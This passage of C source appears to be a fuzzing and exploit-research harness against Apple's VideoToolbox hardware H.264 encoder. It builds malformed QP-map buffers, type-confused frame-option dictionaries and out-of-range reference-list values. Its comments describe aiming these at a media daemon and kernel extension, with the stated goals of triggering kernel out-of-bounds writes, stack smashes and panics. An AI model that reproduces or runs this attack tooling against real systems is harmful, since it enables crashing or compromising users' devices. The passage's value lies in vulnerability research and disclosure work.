                        VTDecodeInfoFlags difl = 0;
                        return (int)VTDecompressionSessionDecodeFrame(dsess, g_ave_cap_sb, 0, NULL, &difl);
                    }, &r1);
                    if (r1 > 0) { res = r1; break; }   /* in-process fault - stop the hammer */
                    for (int i = 0; i < 25 && g_dec_cb_fires <= (int)ri; i++) usleep(200000);   /* v79: 5s per-iteration cap (reviewer fix - no 8min stall) */
                    if (g_dec_cb_fires == prevF) break;   /* v79: fires stopped growing - the decoder dropped the rest; stop the hammer */
                    prevF = g_dec_cb_fires;
                }
                double rMs = ds_ave_elapsed_ms(rt0);
                const char *rv;
                if (res > 0)                  rv = "FAULTED in-process";
                else if (g_dec_cb_ok > 0)     rv = "DECODED";
                else if (g_dec_cb_err != 0)   rv = "cb error";
                else if (g_dec_cb_fires == 0) rv = "no cb - dropped/held";
                else                          rv = "cb fired, no output";
                dprintf(STDOUT_FILENO, "%s  I[%s] REFEED self-decode: cb fires=%d (ok=%d) err=%d out=%lldx%lld t=%.0fms => %s (v79 x%ld HAMMER - the -12909 bad-data NAL parsed %ldx = the repeated decoder-parse hammer; a daemon death/.ips here = the compound parse OOB on the decode half; correlate the decoder-side .ips; a PANIC/reboot = THE 64747 kernel OOB)\n",
                        pfx, tag, g_dec_cb_fires, g_dec_cb_ok, g_dec_cb_err,
                        (long long)g_dec_out_w, (long long)g_dec_out_h, rMs, rv, rl, rl);
                VTDecompressionSessionInvalidate(dsess);
                CFRelease(dsess);
            }
            CFRelease(g_ave_cap_sb);
            g_ave_cap_sb = NULL;
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] REFEED no captured sample (the encode produced no ok output - capture void)\n", pfx, tag);
        }
        g_ave_cap_on = 0;
        g_refeed_loops = 0;   /* v79: reset the hammer loop count for the next row */
    }
mp_sweep_done:
    CFRelease(fp);
    CVBufferRelease(pb);
    if (backing) free(backing);
    if (backing2) free(backing2);
    if (sess) {
        /* v106: poison-aware - see ds_opt_teardown. The 23:52 run: Invalidate on the
         * wedged connection BLOCKS (FigSemaphoreWaitRelative) and the connection-death
         * callback wild-jumps into freed heap = SIGKILL (uncatchable). Leak instead. */
        ds_opt_teardown(pfx, tag, sess);
        sess = NULL;
    }
    ds_journal_write("DONE", tag);
    usleep(300000);
}


/* v108: STACK-SMASH SIZE ORACLE (OPD0). The 00:37 v107 run decoded: the OPC0 sweep
 * RODE the kext again (sessions 40/50 = Pass:2 + MultiPassStorage 0x75a2e88780/
 * 88600 ATTACHED + RCQPRange [0,48] at 192x96), then the NEXT create SMASHED a
 * STACK BUFFER in the FigRPC plist path (asi 'stack buffer overflow', Thread 2
 * pc=0/fp=0/lr=0 = wiped frame -> CODESIGNING SIGKILL - the v102
 * VTMultiPassStorageInvalidate class reappearing at VTCompressionSessionRemote_
 * Create -> FigCreateCFDataFromCFPropertyList -> __CFBinaryPlistWriteOrPresize).
 * Is the smash SIZE- or COUNT-driven? One shot per blob size in SHUFFLED order,
 * journaled per size - the death shot (journal START w/o DONE) = the boundary. */
static void ds_opt_qpmap_sweep(const char *pfx, const char *tag)
{
    if (g_opt_conn_poisoned) {
        dprintf(STDOUT_FILENO, "%s  I[%s] SWEEP-SKIPPED (v107 conn-poisoned)\n", pfx, tag);
        return;
    }
        /* v143 KERNEL-ESCALATION: the value axis is PROVEN consumed on 26.6
         * (+455 repro, QPModFeature 0x10202 kext-side). This sweep hunts the
         * kernel fault: the byte1 axis (0x80 = the 27b1 1013-class exception -
         * the second-consumed-field candidate, never fired on 26.6), the
         * SliceQP-scalar+map COMPOUND (both -13-gate channels at once), and the
         * 4K MB-surface trio (518400/522240/589824 - the 26.6 devType>=30
         * formula differs from 27b1; whichever RIDES = the whole 4K surface of
         * attacker bytes in the kernel; wrong sizes leak the true required in
         * the daemon 'UserQpMapSize mismatch' line). */
        const struct { const char *jid; const char *t; int sw, sh, fw, fh; long mapSz; int fill; int slQP; int xKey; int noTX; int refMode; int expectKill; int pf; int nF; } shots[] = {
        { "C0",  "no-map QP26 fp baseline (B control)",                 1920, 1080, 1920, 1080, 0,      0x33, -1, -1, 0, 0, 0, 0, 8 },
        { "M3a", "TX-ON 2vuy-IOSURF NO-MAP (pf2 anchor)",               1920, 1080, 1920, 1080, 0,      0x33, 26, -1, 0, 0, 0, 2, 2 },
        { "M3",  "map130560 fill=0x33 (the +455 repro anchor)",         1920, 1080, 1920, 1080, 130560, 0x33, 26, -1, 0, 0, 0, 2, 2 },
        { "W6",  "SInt32@0 word=INTMAX every MB (lambda-idx OOB shot)", 1920, 1080, 1920, 1080, 130560, 0x0A00, 26, 0x7FFFFFFF, 0, 0, 0, 2, 2 },
        { "B180","byte1=0x80 (the 1018-class - 2nd-field candidate)",   1920, 1080, 1920, 1080, 130560, 0x0E80, 26, -1, 0, 0, 0, 2, 2 },
        { "K4c", "4K map 589824 0x33 (the CONFIRMED 26.6 4K size - rides)", 4096, 2304, 4096, 2304, 589824, 0x33, 26, -1, 0, 0, 0, 2, 2 },
        { "K4W", "4K 589824 SInt32=INTMAX x36864 MBs (the MAX-SURFACE kernel-value shot)", 4096, 2304, 4096, 2304, 589824, 0x0A00, 26, 0x7FFFFFFF, 0, 0, 0, 2, 2 },
    };
    int nShot = 0, nAcc = 0, nEffect = 0, nDrop = 0, nRej = 0, nNoCb = 0, nNoCbRun = 0, nFault = 0, nTimeout = 0, nKill = 0;
    __block unsigned long bC0 = (unsigned long)-1;   /* v116: C0's output bytes = the landing baseline; -1 = baseline lost (C0 faulted) */
    __block unsigned long long c0h = 0;              /* v124: C0's byte-hash - the byte-level baseline */
    __block unsigned long bFam = (unsigned long)-1;     /* v129: M-family anchor - the first pf2 cell's B (M3a); the M cells compare against it, not C0 */
    for (size_t si = 0; si < sizeof(shots) / sizeof(shots[0]) && !g_opt_conn_poisoned; si++) {
        const char *jid = shots[si].jid;
        const char *st = shots[si].t;
        int sw = shots[si].sw, sh = shots[si].sh, fw = shots[si].fw, fh = shots[si].fh;
        long sz = shots[si].mapSz;
        int hasMap = (sz > 0) ? 1 : 0;   /* v117: mapSz = the UserQpMap CFData size (0 = no map) */
        int fill = shots[si].fill, slQP = shots[si].slQP, xKey = shots[si].xKey;
        int noTX = shots[si].noTX, refMode = shots[si].refMode;
        int pf = shots[si].pf;   /* v119: 0 = 32BGRA, 1 = 2vuy CreateWithBytes, v122/v123: 2 = 2vuy IOSURF (the CV-managed carrier; the -12218 was the noTX LEVER, not the carrier - see the M-SERIES read-off) */
        int nF = shots[si].nF;    /* v121: frames per session - X/C0/K1 = 8 (DPB-populated refs), M/T = 2 */
        char stag[40];
        snprintf(stag, sizeof(stag), "OPC5 %s", jid);
        ds_journal_write("START", stag);
        int sig = 0, es = -999;
        __block int propSt = -999;
        __block int propF = -999;
        __block int propNoTX = -9999;   /* v119: -9999 = noTX not requested; 0 = RAW lever engaged; else the SetProperty error */
        __block VTCompressionSessionRef csOut = NULL;
        unsigned long f0 = (unsigned long)g_ave_cb_fires, o0 = (unsigned long)g_ave_cb_ok;
        unsigned long b0 = (unsigned long)g_ave_cb_bytes;
        g_ave_cb_err = 0;   /* v115-r: per-shot reset - the printed err is THIS shot's, not a stale earlier one */
        g_ave_cb_hash = 0;  /* v124: per-shot hash reset - H is THIS shot's bytes */
        uint64_t t0 = mach_absolute_time();
        sig = ds_ave_guard_run_tmo(^int {
            VTCompressionSessionRef cs = NULL;
            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (sp) CFDictionarySetValue(sp, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
            OSStatus csSt = VTCompressionSessionCreate(NULL, sw, sh, kCMVideoCodecType_H264,
                                                       sp, NULL, NULL, ave_out_cb, NULL, &cs);
            if (sp) CFRelease(sp);
            if (csSt != 0 || !cs) return (int)csSt;
            /* v116: BOTH session-prop spellings - the daemon's prop-handler string is
             * 'kVTCompressionPropertyKey_EnableUserQPMap' (ave.videoencoder), the client
             * key table uses the bare 'EnableUserQPMap'; propB/propF log each result. */
            OSStatus b1 = VTSessionSetProperty(cs, CFSTR("EnableUserQPMap"), kCFBooleanTrue);
            OSStatus b2 = VTSessionSetProperty(cs, CFSTR("kVTCompressionPropertyKey_EnableUserQPMap"), kCFBooleanTrue);
            propSt = (b1 != 0) ? (int)b1 : 0;
            propF = (b2 != 0) ? (int)b2 : 0;
            /* v119: noTX = AllowPixelTransfer=false - the RAW fw/fh buffer reaches the daemon
             * UNSCALED (the v81-proven lever), so the M-cells test the gate against a REAL dims
             * mismatch instead of the client-scaled one. propNoTX logs the SetProperty RESULT
             * (the 14:04 run burned its M-front because this was swallowed - if the lever no-ops,
             * the frame gets pixel-transferred and the exact-size proof silently becomes the
             * TX-scaled failure). propNoTX=0 = the RAW lever ENGAGED; !=0 = it was refused. */
            propNoTX = -9999;
            if (noTX)
                propNoTX = (int)VTSessionSetProperty(cs, ds_kAllowPixelTransfer, kCFBooleanFalse);
            CFDataRef mapDat = NULL;
            if (hasMap && sz > 0) {
                uint8_t *buf = (uint8_t *)malloc((size_t)sz);
                if (!buf) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
                /* v133 pattern engine: fill high byte = kind (0=uniform low-byte fill, 10 = full
                 * 32-bit LE word at bytes 0-3 of EVERY MB (the SInt32@0 value window - the exact
                 * word the kernel reads), 11 = word at MB 0 only (rest zero = position+value
                 * compound), 12 = word at MB 0 amid 0x33 elsewhere (flag-flip vs value-cost split).
                 * The word rides in xKey; slQP stays 26 so the fp SliceQP dict is the normal
                 * gate-opener with NO confound. Low byte = fill value (unused for pk 10-12). */
                int pk = (fill >> 8) & 0xFF, fv = fill & 0xFF;
                if (pk == 0) {
                    memset(buf, fv, (size_t)sz);
                } else {
                    memset(buf, 0x00, (size_t)sz);
                    size_t nMB = (size_t)sz / 16;
                    if (pk == 10) {
                        uint32_t w = (uint32_t)xKey;
                        for (size_t i = 0; i < nMB; i++) {
                            buf[i * 16 + 0] = (uint8_t)(w & 0xFF);
                            buf[i * 16 + 1] = (uint8_t)((w >> 8) & 0xFF);
                            buf[i * 16 + 2] = (uint8_t)((w >> 16) & 0xFF);
                            buf[i * 16 + 3] = (uint8_t)((w >> 24) & 0xFF);
                        }
                    }
                    else if (pk == 11) {
                        uint32_t w = (uint32_t)xKey;
                        buf[0] = (uint8_t)(w & 0xFF);
                        buf[1] = (uint8_t)((w >> 8) & 0xFF);
                        buf[2] = (uint8_t)((w >> 16) & 0xFF);
                        buf[3] = (uint8_t)((w >> 24) & 0xFF);
                    }
                    else if (pk == 12) {
                        memset(buf, 0x33, (size_t)sz);
                        uint32_t w = (uint32_t)xKey;
                        buf[0] = (uint8_t)(w & 0xFF);
                        buf[1] = (uint8_t)((w >> 8) & 0xFF);
                        buf[2] = (uint8_t)((w >> 16) & 0xFF);
                        buf[3] = (uint8_t)((w >> 24) & 0xFF);
                    }
                    else if (pk == 13) {
                        /* v135: ENABLE-FIRST pair sweep - byte0=1 (bit-0 enable) + byte1=0
                         * = the proven +1 class (1031), then ONE target pair = 0x7FFF.
                         * fv = 0 = enable-only control; 23/45/67/89/AB/CD/EF = the pair
                         * byte index (hex-digit decode: p0 = fv>>4, p1 = fv&0xF). The
                         * v134 SInt16@0 proof means EVERY prior field probe (v132 E1/E4/E8)
                         * was a DISABLED-entry confound - this is the FIRST clean probe of
                         * bytes 2-15. Any B != 1031 = a second consumed field. */
                        for (size_t i = 0; i < nMB; i++) {
                            buf[i * 16 + 0] = 0x01;
                            buf[i * 16 + 1] = 0x00;
                        }
                        if (fv != 0) {
                            int p0 = (fv >> 4) & 0xF, p1 = fv & 0xF;
                            if (p0 >= 2 && p1 <= 15 && p1 > p0) {
                                for (size_t i = 0; i < nMB; i++) {
                                    buf[i * 16 + p0] = 0xFF;   /* 0x7FFF LE = 32767 = pos-max SInt16 */
                                    buf[i * 16 + p1] = 0x7F;
                                }
                            }
                        }
                    }
                    else if (pk == 14) {
                        /* v138: TOP-BIT SWEEP - the v137 run found byte1=0x80 (10000000)
                         * = B+1013, the FIRST value outside {1031,1024,1017} - and 0x80 is
                         * the ONLY pattern with the top bit set and nothing else (0x7F
                         * dense-low and 0xFE/0xFF dense-high all = 1017). That is a
                         * bit-pattern-dependent firmware branch, NOT a value-magnitude
                         * effect (0xFE=-511 -> 1017 while 0x80=-32767 -> 1013). v138
                         * walks the single-byte mask axis densely: 0x80/0x81/0xC0/0xE0/
                         * 0xF0/0xF8/0xFC/0xFE (byte0=1 enable fixed). ANY B outside
                         * {1031,1024,1017,1013} = ANOTHER mode class; the mask value at
                         * which 1013 snaps back to 1017 = the parser's field-width /
                         * table-index boundary (the firmware-parser OOB shot). */
                        for (size_t i = 0; i < nMB; i++) {
                            buf[i * 16 + 0] = 0x01;
                            buf[i * 16 + 1] = (uint8_t)fv;
                        }
                    }
                }
                mapDat = CFDataCreate(kCFAllocatorDefault, buf, (CFIndex)sz);
                free(buf);
                if (!mapDat) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
            }
            /* v117: base fp = the long-name SliceQP array ONLY (OP99-proven ride - the
             * 12:41 daemon abort came from the v116 BARE twin). Per-shot cells:
             * slQP>=0 = bare SliceQP CFNumber(value) (the scalar path - the 32-bit
             * field at FrameSettings, no clamp); slQP=-2 = bare SliceQP CFArray (the
             * type-confusion repro: AVE_GetPerFrameData's unconditional CFNumberGetValue
             * -> -[__NSCFArray _getValue:forType:] SIGABRT); xKey = another bare key
             * as CFArray (the same bug on PicParameterSetId/ReferenceL0). */
            CFMutableDictionaryRef fp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (!fp) { if (mapDat) CFRelease(mapDat); VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
            long sq26 = 26;
            CFNumberRef sqn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sq26);
            CFMutableArrayRef sqa = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            if (sqa && sqn) { CFArrayAppendValue(sqa, sqn); }
            if (sqn) CFRelease(sqn);
            if (sqa) {
                CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SliceQP"), sqa);
                CFRelease(sqa);
            }
            if (slQP == -2) {
                CFMutableArrayRef ax = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                CFNumberRef nx = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sq26);
                if (ax && nx) CFArrayAppendValue(ax, nx);
                if (nx) CFRelease(nx);
                if (ax) { CFDictionarySetValue(fp, CFSTR("SliceQP"), ax); CFRelease(ax); }
            } else if (slQP >= 0) {
                long v = (long)slQP;
                CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
                if (nv) { CFDictionarySetValue(fp, CFSTR("SliceQP"), nv); CFRelease(nv); }
            }
            /* v118: the T-series census - xKey selects the bare key that carries a CFArray
             * (the 13:24-proven abort type). 0=PicParameterSetId (crash +4860), 1=ReferenceL0
             * (AVE_Ref_RetrieveArray), 2=UserQpMap (CFData length/ptr getters), 3=VRAUsedDimension
             * (CFNumber SInt32 -> w/h), 4=AttachDPB (CFNumber), 5=FinalFrame (isEqual - census),
             * 6=UserFrameType (isEqual - census), 7=ForceKeyFrame (isEqual - census). expectKill=1
             * = an abort is EXPECTED (the proven getter sites); expectKill=0 = the safe-side census.
             * v134: xKey now carries the T-index as 100+xKey (was 0-16) - the v133 W1/W2 kills
             * were this branch aliasing the map VALUE word (xK=1 -> ReferenceL0, xK=3 ->
             * VRAUsedDimension): the map value words now live in (-inf,100) and can never hit. */
            static const char *const xkeys[17] = {
                "PicParameterSetId", "ReferenceL0", "UserQpMap", "VRAUsedDimension",
                "AttachDPB", "FinalFrame", "UserFrameType", "ForceKeyFrame",
                "ForceRefresh", "RepeatedFrame", "MarkCurrentFrameAsLTR", "RVRADimension",
                "FrameNumForLTRToReplace", "SetDPB", "FirstMbInRecvSlices",
                "SliceAlphaC0OffsetDiv2", "SliceBetaOffsetDiv2"
            };
            if (xKey >= 100 && xKey < 117) {
                CFMutableArrayRef ax = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                CFNumberRef nx = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sq26);
                if (ax && nx) CFArrayAppendValue(ax, nx);
                if (nx) CFRelease(nx);
                if (ax) {
                    CFStringRef kx = CFStringCreateWithCString(kCFAllocatorDefault, xkeys[xKey - 100], kCFStringEncodingUTF8);
                    if (kx) { CFDictionarySetValue(fp, kx, ax); CFRelease(kx); }
                    CFRelease(ax);
                }
            }
            /* v120: the X-series - the ReferenceL0 ref-list PARSER attack with THE REAL KEYS.
             * The daemon's AVE_Ref_RetrieveArray (0x2b9547cbc) clamps the count to 4, then per
             * element reads TWO SInt32s via AVE_CFDict_GetSInt32(el, KEY1/KEY2) into
             * userRefInfo_[4] UNVALIDATED. 14:04 DECODE: X1-X3 ACCEPTed + X5 KILLED proved the
             * parser RUNS our array but the 4 v119 key-guess pairs never landed. v120 CRACKED the
             * real pair from the PAC'd __AUTH_CONST CFStrings (adjacent-string scan @0x2269e8):
             * 'ReferenceFrameNumDriver' + 'ReferenceRVRAIndex'. refMode 1-4 = real pair, ascending
             * values (the LAND oracle - B != C0 or the daemon 'DPBBuffer: frame_num_driver %d' log).
             * v123: refMode 1 = positive control; 2 = FNum INTMAX; 3 = 0xffffffff (REPRO - the
             * 18:31 B-delta); 4 = -2; 5 = INT_MIN; 6 = compound negative; 7 = neg RVRA;
             * 8 = RVRA INT_MIN; 9 = CFString elements (container-conf - the proven kill). */
            if (refMode > 0) {
                CFMutableArrayRef ra = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                if (ra) {
                    if (refMode == 9) {
                        CFStringRef sx = CFSTR("X5 container-confusion");
                        for (int i = 0; i < 4; i++) CFArrayAppendValue(ra, sx);
                    } else {
                        /* v120: THE REAL KEYS (cracked this session from the PAC'd __AUTH_CONST
                         * CFStrings via the adjacent-string pair scan): KEY1 = 'ReferenceFrameNumDriver'
                         * (info+0 -> the userRefFrameNumDriver kernel marshal field - the kext's
                         * 'DPBBuffer: frame_num_driver %d' log) + KEY2 = 'ReferenceRVRAIndex'
                         * (info+4 -> the RVRA index slot - the kext's 'RVRAindices (%d,%d,%d,...)' log).
                         * v119's 4 guesses were ALL wrong (X1/X2/X3 ACCEPTed, nothing landed).
                         * v123: refMode 1 = {6,60} positive control; 2 = FNum INTMAX (clamps);
                         * 3 = 0xffffffff (REPRO - the 18:31 B-delta: INTMAX clamps clean but the
                         * NEGATIVE frame-num takes a different gate path -> the encoder reference
                         * decision changes -> B 264464 vs C0 265243); 4 = -2; 5 = INT_MIN;
                         * 6 = compound (FNum+RVRA both 0xffffffff); 7 = neg RVRA; 8 = RVRA INT_MIN;
                         * 9 = CFString elements (container-conf - the proven kill). */
                        static const char *const kReal[2] = { "ReferenceFrameNumDriver", "ReferenceRVRAIndex" };
                        long a = 1, b = 10;
                        if (refMode == 1) { a = 6; b = 60; }                        /* v123: positive control - the proven-clamped pair (B==C0 all 4 runs) */
                        else if (refMode == 2) { a = 0x7fffffffL; b = 1; }          /* frame-num INTMAX - clamps clean (B==C0 every run) */
                        else if (refMode == 3) { a = 0xffffffffL; b = 1; }          /* v123 REPRO: the 18:31 B-DELTA shape (264464 vs C0 265243 = THE first landed ref) */
                        else if (refMode == 4) { a = 0xfffffffeL; b = 1; }          /* -2 */
                        else if (refMode == 5) { a = 0x80000000L; b = 1; }          /* INT_MIN (SInt32 -2147483648) */
                        else if (refMode == 6) { a = 0xffffffffL; b = 0xffffffffL; } /* compound - BOTH fields negative */
                        else if (refMode == 7) { a = 1; b = 0xffffffffL; }          /* negative RVRA index (the RVRAindices walk) */
                        else if (refMode == 8) { a = 1; b = 0x80000000L; }          /* RVRA INT_MIN */
                        else { a = 1; b = 10; }
                        for (int i = 0; i < 4; i++) {
                            CFMutableDictionaryRef rd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                            if (!rd) continue;
                            CFNumberRef na = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &a);
                            CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &b);
                            CFStringRef sk1 = CFStringCreateWithCString(kCFAllocatorDefault, kReal[0], kCFStringEncodingUTF8);
                            CFStringRef sk2 = CFStringCreateWithCString(kCFAllocatorDefault, kReal[1], kCFStringEncodingUTF8);
                            if (na && sk1) CFDictionarySetValue(rd, sk1, na);
                            if (nb && sk2) CFDictionarySetValue(rd, sk2, nb);
                            if (na) CFRelease(na);
                            if (nb) CFRelease(nb);
                            if (sk1) CFRelease(sk1);
                            if (sk2) CFRelease(sk2);
                            CFArrayAppendValue(ra, rd);
                            CFRelease(rd);
                        }
                    }
                    CFDictionarySetValue(fp, CFSTR("ReferenceL0"), ra);
                    CFRelease(ra);
                }
            }
            if (mapDat) {
                CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_UserQpMap"), mapDat);
                CFDictionarySetValue(fp, CFSTR("UserQpMap"), mapDat);
            }
            /* v132: the v129 S-family SetDPB dead path is CUT - sdpb = xKey-200 made the V-cell
             * xKeys (0x7FFFFFFF/0x80000000) index sVal[]/sCnt[] out of bounds (the v56 OOM class). */
            /* v119: pf=1 = 2vuy (kCVPixelFormatType_422YpCbCr8, 2 bytes/px) - the v81-proven
             * noTX RAW format. 14:04 DECODE: BGRA + AllowPixelTransfer=false = -12218 on EVERY
             * noTX cell INCLUDING the no-map CM control (the client cannot do the raw channel in
             * BGRA) - the M-front was unreadable in v118. 2vuy at matched size rides noTX (v81). */
            size_t bpr = (size_t)fw * ((pf == 1 || pf == 2) ? 2 : 4), len = bpr * (size_t)fh;
            uint8_t *backing = NULL;
            CVPixelBufferRef pb2 = NULL;
            CVReturn cr = -1;
            if (pf == 2) {
                /* v123: pf=2 = 2vuy via the CV-MANAGED IOSURFACE carrier. The 18:31 daemon
                 * console SOLVED the -12218 mystery: kVTPixelTransferNotPermittedErr -
                 * 'VTPixelTransferSessionCreate (for pixel buffer attributes) forbidden by
                 * kVTCompressionPropertyKey_AllowPixelTransfer' at VTCompressionSession.c:7789
                 * = the noTX LEVER ITSELF forbids the pixel-transfer session the IOSURF 2vuy
                 * attributes need (a lever CONFLICT, NOT a format dead-end). v123 flips the
                 * M-cells to transfer-ON so the exact-size map (130560B, daemon-confirmed)
                 * finally rides the kernel memcpy. */
                CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                if (attrs && iosProps) {
                    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
                    cr = CVPixelBufferCreate(NULL, (size_t)fw, (size_t)fh,
                                             kCVPixelFormatType_422YpCbCr8, attrs, &pb2);
                }
                if (attrs) CFRelease(attrs);
                if (iosProps) CFRelease(iosProps);
                if (cr == 0 && pb2) {
                    if (CVPixelBufferLockBaseAddress(pb2, 0) == 0) {
                        memset(CVPixelBufferGetBaseAddress(pb2), 0x41,
                               (size_t)CVPixelBufferGetBytesPerRow(pb2) * (size_t)fh);
                        CVPixelBufferUnlockBaseAddress(pb2, 0);
                    } else {
                        cr = -9998;   /* v122: IOSURF lock failed - the 0x41 fill could not run; abort the cell (a silent unfilled-buffer encode would void the verdict) */
                    }
                }
            } else {
                backing = malloc(len);
                if (backing) {
                    memset(backing, 0x41, len);
                    cr = CVPixelBufferCreateWithBytes(NULL, fw, fh,
                                                      (pf == 1) ? kCVPixelFormatType_422YpCbCr8 : kCVPixelFormatType_32BGRA,
                                                      backing, bpr, NULL, NULL, NULL, &pb2);
                } else cr = -9999;
            }
            if (cr != 0 || !pb2) { if (backing) free(backing); if (fp) CFRelease(fp); if (mapDat) CFRelease(mapDat); VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
            /* v116: THE PB-ATTACHMENT CHANNEL - the v95/96 OP87 'dual' carrier. The 12:23
             * run PROVED the fp-only map never reaches the gate (13/13 ACCEPT incl the
             * 25x-mismatch M1), so the map now also rides as a ShouldPropagate attachment
             * on the source PB. */
            if (mapDat)
                CVBufferSetAttachment(pb2, CFSTR("UserQpMap"), mapDat, kCVAttachmentMode_ShouldPropagate);
            OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
            /* v121: multi-frame sessions - the 17:17 run PROVED a 2-frame DPB clamps every ref
             * ('frame index out of bound -> default to 0' = X1a-d ACCEPT + B==C0 everywhere).
             * With 8 frames, the ref-list rides EVERY frame (early frames' refs to not-yet-
             * existing frames clamp harmlessly - the proven path) but frame nF-1's refs to
             * {6,60}..{3,30} resolve against the populated DPB = the LAND oracle (B != C0).
             * The fp dict is the same for every frame, so C0 and the X-cells are symmetric. */
            for (int fr = 0; fr < nF && b == 0; fr++) {
                /* v122: PER-FRAME STRUCTURED CONTENT (moving gradient) - the 17:49 run
                 * proved flat-0x41 frames are REFERENCE-BLIND: a flat frame encodes to the
                 * same bytes from ANY reference, so even HONORED refs (the kext window
                 * 'm_iLastFrame - iFrameNum < (3+2)' lets {6,60}..{3,30} at frame 7 through)
                 * still produce B==C0. The 8-frame cells now get a frame-index-shifted
                 * row/col pattern so a ref to an older frame yields different residuals ->
                 * the B oracle finally sees a LAND. (Byte-backed only - IOSURF M-cells are
                 * nF=2 and keep the flat fill.) */
                if (nF >= 3 && backing) {
                    for (size_t i = 0; i < len; i++)
                        backing[i] = (uint8_t)(((i % bpr) / 2 + (i / bpr) * 7 + (size_t)fr * 53) & 0xff);
                }
                if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(fr, 600), CMTimeMake(1, 600),
                                    fp, NULL, NULL);
            }
            /* v115: DRAIN inside the guard - the map frame's verdict only exists once the
             * callbacks fire; the gate -1001 (size mismatch) surfaces here as error/no output. */
            if (b == 0) b = VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid);
            if (fp) CFRelease(fp);
            if (mapDat) CFRelease(mapDat);
            CVBufferRelease(pb2);
            free(backing);
            csOut = cs;
            return (int)b;
        }, &es, 10000);
        double tMs = ds_ave_elapsed_ms(t0);
        nShot++;
        if (sig == SIGALRM) {
            nTimeout++; g_opt_conn_poisoned = 1;
            snprintf(stag, sizeof(stag), "OPC5 %s TIMEOUT", jid);
            ds_journal_write("DONE", stag);
            dprintf(STDOUT_FILENO, "%s  I[%s] %s TIMEOUT (watchdog 10s) = CONN DEAD - sweep stops\n", pfx, tag, st);
        } else if (sig > 0) {
            nFault++;
            snprintf(stag, sizeof(stag), "OPC5 %s FAULT", jid);
            ds_journal_write("DONE", stag);
            dprintf(STDOUT_FILENO, "%s  I[%s] %s sig=%d prop=%d t=%.0fms CLIENT-FAULT (our guard - check .ips)\n", pfx, tag, st, sig, propSt, tMs);
        }
        /* v115-r: teardown BEFORE the verdict read - Invalidate flushes the in-flight
         * callbacks synchronously, so the deltas below capture THIS shot only. */
        if (csOut) ds_opt_teardown(pfx, tag, csOut);
        if (sig == 0) {
            unsigned long df = (unsigned long)g_ave_cb_fires - f0;
            unsigned long dO = (unsigned long)g_ave_cb_ok - o0;
            unsigned long dB = (unsigned long)g_ave_cb_bytes - b0;
            if (si == 0) { bC0 = dB; c0h = (unsigned long long)g_ave_cb_hash; }   /* v116/v124: C0's B + H baselines */
            if (pf == 2 && sz == 0 && dO > 0) bFam = dB;       /* v130: every NO-MAP pf2 cell (M3a/D1A/D2A/D3A) = the within-dims anchor for the map cells after it */
            unsigned long refB = (pf == 2) ? bFam : bC0;                          /* v129: within-family reference - C0 for the fp/pf0 cells, M3a for the M-family */
            const char *vd;
            if (es != 0 && df == 0) { vd = "REJECT"; nRej++; }      /* v115-r: client-side error, no output */
            else if (dO > 0) {
                /* v129: EFFECT = frames delivered BUT B deviates from the family reference
                 * (or the cb count falls short of nF) = the ONLY size-visible signal the
                 * sweep has ever produced (v128's M3 was the first: B 1024 vs 265243).
                 * The within-family reference makes the map-content gradient readable:
                 * M3/M3b/M3c/M3d vs M3a = is the exact-size map CONSUMED? */
                int bd = (si > 0 && refB != (unsigned long)-1 && dB != refB) || (df < (unsigned long)nF);
                if (bd) { vd = "EFFECT"; nEffect++; } else { vd = "ACCEPT"; nAcc++; }
            }
            else if (df > 0) { vd = "DROP"; nDrop++; }
            else { vd = "NO-CB"; nNoCb++; }
            /* v117: KILLED = the daemon died on THIS shot (the client saw the conn die
             * mid-encode: es -12912/-12914 = kVTVideoEncoderMalfunctionErr) OR the shot
             * was a deliberate type-confusion probe (expectKill) that did not ACCEPT.
             * The .ips captureTime is the receipt. */
            if (strcmp(vd, "ACCEPT") != 0 && (es == -12912 || es == -12914)) { vd = "KILLED"; nKill++; }
            else if (shots[si].expectKill && strcmp(vd, "ACCEPT") != 0) { vd = "KILLED"; nKill++; }
            snprintf(stag, sizeof(stag), "OPC5 %s %s", jid, vd);
            ds_journal_write("DONE", stag);
            char c0s[16];
            if (refB == (unsigned long)-1) snprintf(c0s, sizeof(c0s), "NA");
            else snprintf(c0s, sizeof(c0s), "%lu", refB);
